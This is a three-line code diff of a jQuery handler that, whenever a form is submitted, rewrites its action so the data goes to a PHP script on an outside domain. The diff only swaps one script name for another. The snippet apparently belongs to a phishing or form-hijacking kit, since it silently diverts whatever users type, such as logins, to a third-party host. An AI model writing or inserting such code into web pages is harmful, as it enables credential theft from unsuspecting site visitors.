@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://pilat-neon.my.id/mister.php");
+  $(myform).attr("action", "https://pilat-neon.my.id/mister1.php");
 });
